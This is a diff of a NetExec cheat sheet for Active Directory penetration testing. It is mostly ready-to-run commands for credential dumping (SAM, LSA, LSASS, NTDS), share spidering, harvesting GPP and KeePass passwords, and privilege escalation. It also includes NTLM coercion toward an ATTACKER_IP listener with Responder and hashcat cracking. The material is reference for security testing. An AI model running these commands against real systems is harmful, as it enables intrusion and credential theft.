@@ -33,11 +33,11 @@ Common protocols include:
 - RDP
 - And sometimes more...
 
-### Admin `Pwn3d!` per protocol
+### Meaning of `Pwn3d!` per protocol
 
 - https://www.netexec.wiki/getting-started/using-credentials#using-credentials
 
-Usually only `smb` or `winrm` are "true" admin, but the rest is usually some level of code execution at least.
+Usually only `smb` or `winrm` are "true" admin, but the rest usually include some level of code execution.
 
 |Protocol|What `Pwn3d!` means|How it checks|
 |---|---|---|
@@ -58,12 +58,35 @@ Usually only `smb` or `winrm` are "true" admin, but the rest is usually some lev
 - "Code execution results in a (Pwn3d!) added after the login confirmation" — this is the universal rule across all code-execution-capable protocols [GitHub](https://github.com/CousTov/UACBypass)
 - LDAP `Pwn3d!` is fundamentally different — it doesn't mean code execution, it means **AD privilege**. A user with DCSync gets `Pwn3d!` on LDAP but might be `[+]` only on SMB
 
-## Generating Hosts File
+## Kerberos
+
+### Generating `Hosts` File
 
 ```bash
-nxc smb <TARGETS> --generate-hosts-file nxc_hosts
-sudo cp /etc/hosts /etc/hosts.bak_$(date +%Y-%m-%d_%H:%M:%S)
-cat nxc_hosts | sudo tee -a /etc/hosts
+nxc smb <DC_IP> --generate-hosts-file nxc_hosts && sudo cp -v /etc/hosts /etc/hosts.bak_$(date +%Y-%m-%d_%H:%M:%S) && cat nxc_hosts | sudo tee -a /etc/hosts
+```
+
+### Generate `krb5.conf` File
+
+```bash
+nxc smb <DC_FQDN> --generate-krb5-file krb5.conf && sudo mv -v /etc/krb5.conf /etc/krb5.conf.bak && sudo cp -v krb5.conf /etc/krb5.conf
+```
+
+### Usage
+
+**Get a TGT (saves to `<USER>.ccache`):**
+```bash
+nxc smb <DC_FQDN> -u <USER> -p '<PASSWORD>' --generate-tgt <USER>
+```
+
+**Get a TGT from a PFX certificate:**
+```bash
+nxc smb <DC_FQDN> -u '<USER>' --pfx-cert <CERT>.pfx --generate-tgt '<USER>'
+```
+
+**Use an existing TGT from ccache `--use-kcache` since `-k` alone tries fresh TGT request:**
+```bash
+KRB5CCNAME=<USER>.ccache nxc smb <DC_FQDN> --use-kcache -k
 ```
 
 ## Database
@@ -110,15 +133,27 @@ export shares detailed shares.csv
 export local_admins detailed local_admins.csv
 ```
 
-## Password Spraying
+## Modules
 
-Password spraying uses one password against many users (alternates users), which has **no risk of account lockout** compared to brute-forcing. This is useful as a "hail Mary" to find any way in!
+- https://www.netexec.wiki/getting-started/using-modules
 
-**Best practice**: Obtain account lockout policy beforehand (via enumeration or asking customer); if password policy is unknown, a good rule of thumb is to wait a few hours between attempts, which should be long enough for the account lockout threshold to reset.
-
-**Spray same password against all protocols (local and domain auth)**
 ```bash
-# NOTE: this misses local authentication for MSSQL "-d ."
+# Show modules for protocol
+nxc <PROTOCOL> -L
+
+# Show more info for module
+nxc <PROTOCOL> -M <MODULE> --options
+
+# Set modules options
+# NOTE: SPACE BETWEEN MODULES
+nxc <PROTOCOL> -M <MODULE> -o <MOD_KEY>=<MOD_VALUE> <MOD_KEY>=<MOD_VALUE>,...
+```
+
+## Protocol Spraying
+
+**Spray valid creds against all protocols (local and domain auth) to see if one offers more privileges**
+```bash
+# NOTE: this misses local authentication for "nxc mssql -d ."
 for proto in $(nxc -h 2>&1 | grep -oP '(?<=\{)[^}]+(?=\})' | head -1 | tr ',' ' '); do
   for auth in "--local-auth" "-d <DOMAIN>"; do
     echo "[*] $proto -- $auth" | tee -a nxc_spray_all_protos.txt
@@ -129,24 +164,12 @@ done
 
 ## SMB
 
-### Null Session Enumeration
+### Basic Enumeration
 
 Single command covers users, groups, shares, and password policy via null/anonymous session:
 
 ```bash
 nxc smb <TARGET> -u '' -p '' --users --groups --shares --pass-pol --rid-brute 10000
-```
-
-### Password Policy Enumeration
-
-Enumerate password policy information via SMB:
-
-```bash
-# Anonymous password policy enumeration
-nxc smb <TARGET> --pass-pol
-
-# Authenticated password policy enumeration
-nxc smb <TARGET> -u <USER> -p <PASS> --pass-pol
 ```
 
 ### User Enumeration
@@ -158,8 +181,8 @@ nxc smb <TARGET> -u <USER> -p <PASS> --pass-pol
 ```bash
 # Enumerate users via SMB (anonymous)
 nxc smb <DC_IP> -u '' -p '' --users
-nxc smb <DC_IP> -u '' -p '' --rid-brute 10000 > all.txt
-grep all.txt SidTypeUser | cut -d "\\" -f 2 | cut -d " " -f 1 | grep -v \\$ > users.txt
+nxc smb <DC_IP> -u '' -p '' --rid-brute 10000 > nxc_rid_users.txt
+grep SidTypeUser nxc_rid_users.txt | cut -d "\\" -f 2 | cut -d " " -f 1 | grep -v \\$ > users.txt
 
 # Authenticated user enumeration
 nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --users
@@ -185,6 +208,16 @@ nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --loggedon-users
 
 ```bash
 nxc smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --computers
+```
+
+### Get machine IP address and domains
+
+```bash
+# WMI
+nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M get_netconnections
+
+# RPC
+nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M ioxidresolver
 ```
 
 ### Shares Enumeration
@@ -223,7 +256,14 @@ nxc smb <TARGET> -u <USER> -d <DOMAIN> -H <PASS_HASH>
 
 ### Credential Dumping
 
-#### SAM Database
+#### Hash Defaults
+
+| Hash Value                             | Type   | Meaning                                                                                                                      |
+| :------------------------------------- | :----- | :--------------------------------------------------------------------------------------------------------------------------- |
+| **`aad3b435b51404eeaad3b435b51404ee`** | **LM** | **Empty / Disabled.** LM is disabled on modern Windows -- this placeholder appears for every user. Ignore it.               |
+| **`31d6cfe0d16ae931b73c59d7e0c089c0`** | **NT** | **Empty String.** The user has **no password**. Common for `Guest` or `Administrator` if not enabled/set.                   |
+
+#### SAM Database `--sam`
 
 SAM database secrets in `HKLM\SAM`. Works on any Windows host.
 
@@ -232,7 +272,7 @@ SAM database secrets in `HKLM\SAM`. Works on any Windows host.
 nxc smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --sam
 ```
 
-#### LSA Secrets
+#### LSA Secrets `--lsa`
 
 LSA domain and other secrets in `HKLM\SECURITY`. [Gives DCC2 hashes which are only crackable -- not passable.]({{% ref "hashcat.md#windows-hashes" %}})
 
@@ -241,22 +281,25 @@ LSA domain and other secrets in `HKLM\SECURITY`. [Gives DCC2 hashes which are on
 nxc smb <TARGET> --local-auth -u <USER> -p <PASSWORD> --lsa
 ```
 
-#### LSASS Dump 
+#### LSASS Dump
 
-Active session hashes from process memory of `lsass.exe`
+Active session hashes (or cleartest passwords) from process memory of `lsass.exe`
 
 ```bash
-# lsassy (preferred -- fileless, fast)
-nxc smb <TARGET> -u <USER> -p '<PASS>' -M lsassy
-
 # nanodump (stealthiest -- clones existing handles)
+# NOTE: creates file on target
 nxc smb <TARGET> -u <USER> -p '<PASS>' -M nanodump
 
-# handlekatz (obfuscated dump via cloned handles)
-nxc smb <TARGET> -u <USER> -p '<PASS>' -M handlekatz
-
 # procdump (noisiest -- drops Sysinternals binary)
+# NOTE: creates file on target
 nxc smb <TARGET> -u <USER> -p '<PASS>' -M procdump
+
+# lsassy (fileless, fast)
+nxc smb <TARGET> -u <USER> -p '<PASS>' -M lsassy
+
+# handlekatz (obfuscated dump via cloned handles)
+# NOTE: creates file on target
+nxc smb <TARGET> -u <USER> -p '<PASS>' -M handlekatz
 ```
 
 #### NTDS Dump
@@ -278,31 +321,147 @@ nxc smb <TARGET> -u <USER> -p <PASSWORD> --ntds --user krbtgt
 nxc smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> -M ntdsutil
 ```
 
-**Full dump with history and timestamps**
+**Full dump with history and timestamps and Kerberos keys**
 ```bash
 nxc smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> --ntds --history --kerberos-keys
 ```
 
-#### Hash Defaults
-
-| Hash Value                             | Type   | Meaning                                                                                                                      |
-| :------------------------------------- | :----- | :--------------------------------------------------------------------------------------------------------------------------- |
-| **`aad3b435b51404eeaad3b435b51404ee`** | **LM** | **Empty / Disabled.** LM is disabled on modern Windows -- this placeholder appears for every user. Ignore it.               |
-| **`31d6cfe0d16ae931b73c59d7e0c089c0`** | **NT** | **Empty String.** The user has **no password**. Common for `Guest` or `Administrator` if not enabled/set.                   |
-
 ### Uploading and Getting Files
 
-`\\Windows\\Temp\\whoami.txt`
+**Example `<FULL_FILE_PATH>`:**
+- `'\\windows\system32\drivers\etc\hosts'`
 
-**Download file (use full file path)**
+**Download**
 ```bash
-netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --share <SHARE> --get-file <FULL_FILE_PATH> <OUTFILE>
+netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --share <SHARE> --get-file '<FULL_FILE_PATH>' <OUT_FILE>
 ```
 
-**Upload file (use full file path)**
+**Upload**
 ```bash
 # NOTE: use '\Windows\Temp\FILE' or '\\SHARE\folder' without the drive letter
-netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --share <SHARE> --put-file <FILE> '<FULL_FILE_PATH>'
+netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --share <SHARE> --put-file <IN_FILE> '<FULL_FILE_PATH>'
+```
+
+### `spider`
+
+**Search for filename PATTERN like `password`**
+```bash
+netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --spider <SHARE> --pattern "<PATTERN>"
+```
+
+**Search for file contents PATTERN like `password`**
+```bash
+netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --spider <SHARE> --content --regex "<PATTERN>"
+```
+
+**Show all files in share**
+```bash
+netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --spider <SHARE> --regex .
+```
+
+### `spider_plus`
+
+Download all files from all shares except the excluded defaults; max file size `1 MB`
+
+```bash
+nxc smb <TARGET> -u <USER> -p <PASS> -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=$HOME/nxc_spider MAX_FILE_SIZE=$((1024 * 1024 * 1)) EXCLUDE_FILTER='admin$,c$,ipc$,print$,NETLOGON,SYSVOL'
+```
+
+### `gpp_password`
+
+- https://adsecurity.org/?p=2288
+
+**NOTE:** Usually for DCs
+
+Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences (GPP)
+
+```bash
+nxc smb <TARGET> -u <USER> -p <PASS> -M gpp_password
+```
+
+### `gpp_autologin`
+
+**NOTE:** Usually for DCs
+
+Searches the Domain Controller for `registry.xml` files to find autologin information and returns the username and clear text password if present
+
+```bash
+nxc smb <TARGET> -u <USER> -p <PASS> -M gpp_autologin
+```
+
+### KeePass collection
+
+**NOTE:** reminder to clean trigger
+
+```bash
+# Find configs and database files
+nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M keepass_discover
+
+# Attempt to collect master pass
+nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=<XML_CONFIG>
+
+# Read passwords
+grep -A1 -i password /tmp/export.xml
+
+# Remove/clean trigger
+nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M keepass_trigger -o ACTION=CLEAN KEEPASS_CONFIG_PATH=<XML_CONFIG>
+```
+
+#### Open KeePass
+
+```bash
+sudo apt install -y flatpak
+flatpak remote-add --user --if-not-exists flathub https://dl.flathub.org/repo/flathub.flatpakrepo
+flatpak install --assumeyes --user flathub org.keepassxc.KeePassXC
+flatpak run org.keepassxc.KeePassXC
+```
+
+### Enable RDP
+
+```bash
+nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M rdp -o ACTION=enable
+```
+
+### `drop-sc` NTLM Coercion via Writable Share
+
+NOTE: requires write access to target share + Responder listening on `tun0`
+
+```bash
+# Start Responder first
+sudo responder -I tun0 -wv
+
+# Drop the coercion file on the writable share
+nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -M drop-sc -o URL=\\<ATTACKER_IP>\secret FILENAME=secret
+
+# Crack captured NTLMv2 hash
+hashcat -m 5600 <HASH_FILE> /usr/share/wordlists/rockyou.txt
+```
+
+## DC Vulnerability Scanning
+
+Triage a DC for unpatched critical vulnerabilities. For exploitation see [DC Vulnerability Attacks]({{% ref "active-directory.md#dc-vulnerability-attacks" %}}).
+
+### No creds required
+
+```bash
+nxc smb <DC_IP> -M zerologon
+nxc smb <DC_IP> -M ms17-010
+```
+
+### Petitpotam, DFSCoerce, ShadowCoerce, Printerbug, MSEven
+
+- `coerce_plus`: https://www.netexec.wiki/smb-protocol/scan-for-vulnerabilities#scan-for-coerce-vulnerabilities
+
+Includes the popular forced authentication techniques
+
+```bash
+# Scan
+nxc smb <DC_IP> -u <USER> -p '<PASS>' -M coerce_plus
+```
+
+```bash
+# Trigger auth
+nxc smb <DC_FQDN> -u <USER> -p '<PASS>'k -M coerce_plus -o METHOD=<TECHNIQUE> LISTENER=<ATTACKER_IP>
 ```
 
 ## LDAP
@@ -324,6 +483,33 @@ Find high-value users with `adminCount=1` (includes `Domain Admins`, `Enterprise
 ```bash
 # Enumerate users with adminCount=1 via LDAP
 nxc ldap <DC_FQDN> -u <USER> -p <PASSWORD> --admin-count
+```
+
+### Discover IPs and domain names
+
+```bash
+# IP and domain names
+netexec ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M get-network -o ALL=true
+```
+
+### User Account Description
+
+Both modules dump user descriptions for the accounts.
+
+```bash
+# Dump ones likely with passwords
+nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M user-desc
+
+# Dump all
+nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M get-desc-users
+```
+
+### `groupmembership`
+
+Show a user's groups.
+
+```bash
+nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M groupmembership -o USER='<USER>'
 ```
 
 ### Unconstrained Delegation
@@ -364,6 +550,14 @@ nxc smb <DC_FQDN> -u <USER> -p '<PASS>' -X "Get-ADServiceAccount -Filter * -Prop
 nxc ldap <DC_FQDN> -u <GMSA_READER_USER> -p '<PASS>' --gmsa
 ```
 
+### `adcs` (Certificates)
+
+Active Directory Certificate Services (ADCS) is Windows' built-in PKI that issues and manages digital certificates -- misconfigurations in certificate templates can allow domain privilege escalation (ESC1-ESC8).
+
+```bash
+netexec ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M adcs
+```
+
 ### ASREPROAST
 
 - https://www.netexec.wiki/ldap-protocol/asreproast
@@ -396,7 +590,7 @@ nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' --kerberoasting nxc_kerberoast.txt
 
 **NOTE:** this [protocol has file operations --get-file and --put-file functions as well](#uploading-and-getting-files)
 
-MSSQL has 3 types of authentication: domain, local auth, and SQL account; all 3 should be tried to find valid creds.
+[MSSQL has 3 types of authentication: domain, local auth, and SQL account; all 3 should be tried to find valid creds.](https://www.netexec.wiki/mssql-protocol/authentication)
 
 ```bash
 # (domain) Active Directory Account
@@ -423,6 +617,14 @@ nxc mssql <TARGET> -d . -u '<USER>' -p '<PASSWORD>' -q "SELECT table_name FROM <
 
 # Dump a table
 nxc mssql <TARGET> -d . -u '<USER>' -p '<PASSWORD>' -q "SELECT * FROM <DB>.dbo.<TABLE>"
+```
+
+### Impersonation
+
+```bash
+nxc mssql <TARGET> -u <USER> -p '<PASSWORD>' -M mssql_priv -o ACTION=enum_priv
+
+nxc mssql <TARGET> -u <USER> -p '<PASSWORD>' -M mssql_priv -o ACTION=privesc
 ```
 
 ## RDP
@@ -502,207 +704,3 @@ nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -x "dir c:\windows\temp\*_BloodHound.
 nxc smb <TARGET> -u <USER> -p '<PASSWORD>' --get-file \\windows\\temp\\<BLOODHOUND_LOGS>.zip BloodHound_logs.zip
 ```
 
-## DC Vulnerability Scanning
-
-Triage a DC for unpatched critical vulnerabilities. For exploitation see [DC Vulnerability Attacks]({{% ref "active-directory.md#dc-vulnerability-attacks" %}}).
-
-```bash
-# No creds required
-nxc smb <DC_IP> -M zerologon
-nxc smb <DC_IP> -M ms17-010
-
-# Domain user required
-nxc smb <DC_IP> -u <USER> -p '<PASS>' -M nopac
-nxc smb <DC_IP> -u <USER> -p '<PASS>' -M petitpotam
-nxc smb <DC_IP> -u <USER> -p '<PASS>' -M dfscoerce
-nxc --verbose smb <DC_IP> -u <USER> -p '<PASS>' -M shadowcoerce
-
-# Loop
-
-USER="<USER>"
-PASS="<PASSWORD>"
-declare -A MODULES
-MODULES[zerologon]=""
-MODULES[ms17-010]=""
-MODULES[nopac]="-u $USER -p '$PASS'"
-MODULES[petitpotam]="-u $USER -p '$PASS'"
-MODULES[dfscoerce]="-u $USER -p '$PASS'"
-MODULES[shadowcoerce]="-u $USER -p '$PASS'"
-for module in "${!MODULES[@]}"; do
-  echo "[*] $module -- ${MODULES[$module]:-no creds}" | tee -a vuln_scan.txt
-  nxc smb <DC_IP> ${MODULES[$module]} -M $module 2>/dev/null | tee -a vuln_scan.txt
-done
-```
-
-## Modules
-
-- https://www.netexec.wiki/getting-started/using-modules
-
-```bash
-# Show modules for protocol
-nxc <PROTOCOL> -L
-
-# Show more info for module
-nxc <PROTOCOL> -M <MODULE> --options
-
-# Set modules options
-# NOTE: SPACE BETWEEN MODULES
-nxc <PROTOCOL> -M <MODULE> -o <MOD_KEY>=<MOD_VALUE> <MOD_KEY>=<MOD_VALUE>,...
-```
-
-| Module             | Command                        | Purpose                       |
-| ------------------ | ------------------------------ | ----------------------------- |
-| **`spider_plus`**  | `nxc smb <T> -M spider_plus`   | Crawl shares, index all files |
-| **`ntdsutil`**     | `nxc smb <T> -M ntdsutil`      | Safe NTDS dump from disk      |
-| **`lsassy`**       | `nxc smb <T> -M lsassy`        | Remote LSASS dump + parse     |
-| **`laps`**         | `nxc ldap <T> -M laps`         | Read LAPS passwords           |
-| **`gpp_password`** | `nxc smb <T> -M gpp_password`  | GPP cpassword decrypt         |
-| `ntds-dump-raw`    | `nxc smb <T> -M ntds-dump-raw` | Raw disk NTDS extraction      |
-| `nanodump`         | `nxc smb <T> -M nanodump`      | Stealthier LSASS dump         |
-| `gpp_autologin`    | `nxc smb <T> -M gpp_autologin` | GPP autologon creds           |
-| `webdav`           | `nxc smb <T> -M webdav`        | Check if WebDAV enabled       |
-
-### SMB
-
-#### `spider`
-
-**Search for filename PATTERN like `password`**
-```bash
-netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --spider <SHARE> --pattern "<PATTERN>"
-```
-
-**Search for file contents PATTERN like `password`**
-```bash
-netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --spider <SHARE> --content --regex "<PATTERN>"
-```
-
-**Show all files in share**
-```bash
-netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --spider <SHARE> --regex .
-```
-
-#### `spider_plus`
-
-Download all files from all shares except the excluded defaults; max file size `1 MB`
-
-```bash
-nxc smb <TARGET> -u <USER> -p <PASS> -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=$HOME/nxc_spider MAX_FILE_SIZE=$((1024 * 1024 * 1)) EXCLUDE_FILTER='admin$,c$,ipc$,print$,NETLOGON,SYSVOL'
-```
-
-#### `gpp_password`
-
-- https://adsecurity.org/?p=2288
-
-**NOTE:** Usually for DCs
-
-Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences (GPP)
-
-```bash
-nxc smb <TARGET> -u <USER> -p <PASS> -M gpp_password
-```
-
-#### `gpp_autologin`
-
-**NOTE:** Usually for DCs
-
-Searches the Domain Controller for `registry.xml` files to find autologin information and returns the username and clear text password if present
-
-```bash
-nxc smb <TARGET> -u <USER> -p <PASS> -M gpp_autologin
-```
-
-#### Get machine IP address and domains
-
-```bash
-# WMI
-nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M get_netconnections
-
-# RPC
-nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M ioxidresolver
-```
-
-#### KeePass collection
-
-**NOTE:** reminder to clean trigger
-
-```bash
-# Find configs and database files
-nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M keepass_discover
-
-# Attempt to collect master pass
-nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=<XML_CONFIG>
-
-# Read passwords
-grep -A1 -i password /tmp/export.xml
-
-# Remove/clean trigger
-nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M keepass_trigger -o ACTION=CLEAN KEEPASS_CONFIG_PATH=<XML_CONFIG>
-```
-
-#### Enable RDP
-
-```bash
-nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M rdp -o ACTION=enable
-```
-
-#### `drop-sc` NTLM Coercion via Writable Share
-
-NOTE: requires write access to target share + Responder listening on `tun0`
-
-```bash
-# Start Responder first
-sudo responder -I tun0 -wv
-
-# Drop the coercion file on the writable share
-nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -M drop-sc -o URL=\\<ATTACKER_IP>\secret FILENAME=secret
-
-# Crack captured NTLMv2 hash
-hashcat -m 5600 <HASH_FILE> /usr/share/wordlists/rockyou.txt
-```
-
-### LDAP
-
-#### User Account Description
-
-Both modules dump user descriptions for the accounts.
-
-```bash
-# Dump ones likely with passwords
-nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M user-desc
-
-# Dump all
-nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M get-desc-users
-```
-
-#### `groupmembership`
-
-Show a user's groups.
-
-```bash
-nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M groupmembership -o USER='<USER>'
-```
-
-#### Discover IPs and domain names
-
-```bash
-# IP and domain names
-netexec ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M get-network -o ALL=true
-```
-
-#### `adcs`
-
-Active Directory Certificate Services (ADCS) is Windows' built-in PKI that issues and manages digital certificates -- misconfigurations in certificate templates can allow domain privilege escalation (ESC1-ESC8).
-
-```bash
-netexec ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' -M adcs
-```
-
-### MSSQL
-
-#### Impersonation
-
-```bash
-nxc mssql <TARGET> -u <USER> -p '<PASSWORD>' -M mssql_priv -o ACTION=enum_priv
-
-nxc mssql <TARGET> -u <USER> -p '<PASSWORD>' -M mssql_priv -o ACTION=privesc
-```
